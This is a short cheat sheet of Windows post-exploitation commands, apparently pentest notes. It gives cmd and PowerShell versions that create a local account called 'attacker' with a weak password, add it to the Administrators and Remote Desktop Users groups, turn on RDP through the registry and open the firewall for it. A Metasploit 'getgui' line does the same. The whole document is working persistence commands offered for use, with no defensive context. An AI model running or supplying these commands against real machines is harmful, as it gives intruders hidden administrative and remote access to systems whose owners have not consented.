# Adding Admin user + adding to RDP
### Command Prompt
```powershell
net user /add attacker password123
net localgroup administrators attacker /add
net localgroup "Remote Desktop Users" attacker /add
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

### Powershell
```powershell
net user /add attacker password123
net localgroup administrators attacker /add
net localgroup "Remote Desktop Users" attacker /add
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

# getgui (Metasploit)
```
run getgui -e -u atk -p atk
```

